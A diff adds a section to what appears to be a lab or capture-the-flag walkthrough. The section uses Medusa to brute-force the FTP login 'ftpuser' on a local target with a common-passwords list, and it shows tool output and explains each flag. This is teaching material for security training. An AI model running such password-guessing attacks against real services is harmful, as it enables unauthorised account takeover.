@@ -651,3 +651,27 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
 ```
 
+### Targeting the FTP Server
+Having identified the **FTP** server, you can proceed to brute-force its authentication mechanism.
+
+If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the **FTP** sever **username** being `ftpuser`. Based on this, we can modify our Medusa command accordingly:
+```bash
+$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+GENERAL: Parallel Hosts: 1 Parallel Logins: 5
+GENERAL: Total Hosts: 1
+GENERAL: Total Users: 1
+GENERAL: Total Passwords: 197
+...
+ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
+...
+GENERAL: Medusa has finished.
+```
+The key differences here are:
+- `-h 127.0.0.1`: Targets the local system, as the **FTP** server is running locally. Using the IP address tells medusa explicitly to use IPv4.
+- `-u ftpuser`: Specifies the username `ftpuser`.
+- `-M ftp`: Selects the **FTP** module within **Medusa**.
+- `-t 5`: Increases the number of parallel login attempts to **5**.
+### Retrieving The Flag
